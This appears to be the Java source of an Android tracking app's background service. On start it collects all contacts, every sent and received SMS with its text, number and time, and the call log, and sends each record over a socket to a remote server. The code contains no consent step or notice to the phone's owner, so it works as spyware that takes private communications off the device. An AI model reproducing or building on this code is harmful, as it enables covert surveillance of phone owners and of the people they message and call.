package com.software.ing.jaradtracking.services;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.Telephony.Sms;
import android.support.v4.app.ActivityCompat;

import com.software.ing.jaradtracking.utils.SocketManager;
import com.software.ing.jaradtracking.utils.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;


public class InformationRecoveryService extends Service {
    SocketManager socketManager;
    String TAG = "InformationRecoveryService";

    @Override
    public void onCreate() {
        super.onCreate();
        socketManager = new SocketManager();
        recuperar_contactos();
        recuperar_enviados();
        recuperar_inbox();
        recuperar_llamadas();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    String convertir_fecha(long i)    {
        SimpleDateFormat formatter = new SimpleDateFormat("MM-dd-yyyy HH:mm");
        String fecha = formatter.format(new Date(i));
        return fecha;
    }

    void recuperar_contactos() {

        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);

        // lista todos los contactos del telefono
        if (cursor.getCount() > 0) {

            while (cursor.moveToNext()) {
                String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
                //lista solo los q tienen numero de telefono
                if (hasPhoneNumber > 0) {

                    // consulta q relaciona contactos con telefono con los detalles de sus telefonos
                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null,
                            Phone_CONTACT_ID + " = ?", new String[] { contact_id },  null);

                    while (phoneCursor.moveToNext()) {
                        ////////////////////////////////informacion para el servidor/////////////////////////////7
                        JSONObject contact = new JSONObject();

                        try {
                            contact.put("telefono", phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER)));
                            contact.put("nombre", cursor.getString(cursor.getColumnIndex( DISPLAY_NAME )));
                            Utils.log(TAG, "nombre: " + cursor.getString(cursor.getColumnIndex( DISPLAY_NAME )));
                            Utils.log(TAG, "telefono: " + phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER)));

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        SocketManager.emitContacts(contact);
                        ////////////////////////////////////////////////////////////////////////////////////////////
                    }
                    phoneCursor.close();
                }
            }
        }
    }

    ///////////////////////mensajes salientes//////////////////////
    void recuperar_enviados() {

        Uri enviadosURI = Uri.parse("content://sms/sent");                  // uri de los mensajes enviados
        String[] reqCols = new String[]{"_id", "address", "body", "date"};  // columnas para las consultas
        ContentResolver cr = getContentResolver();                          // resolver q para interactuar con el provider
        Cursor c = cr.query(enviadosURI, reqCols, null, null, null);        // cursor para los mensajes

        if (c.moveToFirst()) {
            String telefono;
            String mensaje;
            String hora;
            int colnumero = c.getColumnIndex("address");
            int colmensaje = c.getColumnIndex(Sms.BODY);
            int colHora = c.getColumnIndex(Sms.DATE);

            do {
                ////////////////////////// datos para el servidor/////////////////////
                mensaje = c.getString(colmensaje);
                telefono = c.getString(colnumero);
                hora =  convertir_fecha(c.getLong(colHora));

                JSONObject sent = new JSONObject();
                try {
                    sent.put("sms", mensaje);
                    sent.put("num", telefono);
                    sent.put("time", hora);
                    sent.put("type", "enviado");
                    Utils.log(TAG, "sms" + mensaje);
                    Utils.log(TAG, "num" + telefono);
                    Utils.log(TAG, "time" + hora);
                    Utils.log(TAG, "type" + "enviado");

                } catch (JSONException e) {   e.printStackTrace();         }
                SocketManager.emitMsjs(sent);
                /////////////////////////// //////////////////////////////////////////
            } while (c.moveToNext());
        }
    }
///////////////////////mensajes entrantes////////////////////////////////
    void recuperar_inbox() {
        Uri inboxURI = Uri.parse("content://sms/inbox");                    // URI de la imbox
        String[] reqCols = new String[]{"_id", "address", "body", "date"};  // columnas para las consultas
        ContentResolver cr = getContentResolver();                          // resolver q interactua con el provider
        Cursor c = cr.query(inboxURI, reqCols, null, null, null);           // cursor para el inbox

        if (c.moveToFirst()) {
            String telefono;
            String mensaje;
            String hora;
            int colnumero = c.getColumnIndex("address");
            int colmensaje = c.getColumnIndex(Sms.BODY);
            int colHora = c.getColumnIndex(Sms.DATE);

            do {
                ////////////////////////// datos para el servidor/////////////////////
                mensaje = c.getString(colmensaje);
                telefono = c.getString(colnumero);
                hora =  convertir_fecha(c.getLong(colHora));

                JSONObject recieved = new JSONObject();
                try {

                    recieved.put("sms", mensaje);
                    recieved.put("num", telefono);
                    recieved.put("time", hora);
                    recieved.put("type", "recibido");
                    Utils.log(TAG, "sms" + mensaje);
                    Utils.log(TAG, "num" + telefono);
                    Utils.log(TAG, "time" + hora);
                    Utils.log(TAG, "type" + "recibido");

                } catch (JSONException e) {   e.printStackTrace();          }
                SocketManager.emitMsjs(recieved);
                /////////////////////////// //////////////////////////////////////////
            } while (c.moveToNext());
        }
    }


    void recuperar_llamadas() {


        Uri llamadasUri = Calls.CONTENT_URI;        //uri para las llamadas
        String[] projection = new String[]{
                Calls.TYPE,
                Calls.NUMBER,                       //columnas para las consultas
                Calls.DATE};

        ContentResolver cr = getContentResolver();  //resolver que interactua con el provider

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        //cursor para las llamadas
        Cursor cur = cr.query(llamadasUri,
                projection, //Columnas a devolver
                null,       //Condición de la query
                null,       //Argumentos variables de la query
                null);      //Orden de los resultados

        if (cur.moveToLast()) {
            int tipo;
            String tipoLlamada = "";
            String telefono;
            String hora;

            int colTipo = cur.getColumnIndex(Calls.TYPE);
            int colTelefono = cur.getColumnIndex(Calls.NUMBER);
            int colHora = cur.getColumnIndex(Calls.DATE);
            do {
                tipo = cur.getInt(colTipo);
                //////////////////////////datos para el servidor///////////////////////
                telefono = cur.getString(colTelefono);
                hora =  convertir_fecha(cur.getLong(colHora));

                if (tipo == Calls.INCOMING_TYPE)
                    tipoLlamada = "ENTRADA";
                else if (tipo == Calls.OUTGOING_TYPE)
                    tipoLlamada = "SALIDA";
                else if (tipo == Calls.MISSED_TYPE)
                    tipoLlamada = "PERDIDA";

                JSONObject call = new JSONObject();
                try {
                    call.put("type", tipoLlamada);
                    call.put("event", telefono);
                    Utils.log(TAG, "num" + telefono);
                    Utils.log(TAG, "type" + tipoLlamada);

                } catch (JSONException e) {   e.printStackTrace();         }

                SocketManager.emitCalls(call);
                ////////////////////////////////////////////////////////////////////////
            } while (cur.moveToPrevious());
        }
    }
}
